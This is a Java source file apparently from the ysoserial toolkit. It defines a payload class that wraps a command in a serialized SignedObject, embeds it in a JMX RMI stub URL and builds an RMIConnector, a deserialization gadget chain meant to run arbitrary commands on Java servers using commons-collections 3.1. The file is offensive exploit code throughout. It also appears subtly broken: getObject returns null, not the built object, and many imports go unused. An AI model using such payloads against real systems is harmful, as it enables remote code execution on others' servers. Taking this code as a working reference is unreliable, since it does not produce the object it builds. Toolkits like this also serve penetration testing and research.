package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.syndication.feed.impl.ObjectBean;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.Serializer;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import javax.xml.transform.Templates;
import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static ysoserial.payloads.util.Gadgets.createSignedObject;
import static ysoserial.payloads.util.Gadgets.getTargetPayload;

@Dependencies({"commons-collections:commons-collections:3.1"})
@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Authors({ Authors.J1an })
public class SecObjRMICon extends PayloadRunner implements ObjectPayload<Object> {


    public Object getObject(final String command) throws Exception {
        SignedObject signedObject=createSignedObject(command);
        byte[] base64Obj = Base64.encodeBase64(Serializer.serialize(signedObject));
        String finalStubBase64URL="service:jmx:rmi:///stub/" + new String(base64Obj);
        JMXServiceURL jmxServiceURL = new JMXServiceURL(finalStubBase64URL);
        RMIConnector rmiConnector = new RMIConnector(jmxServiceURL,new HashMap());


        return null;
    }

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(SecObjRMICon.class, args);
	}
}
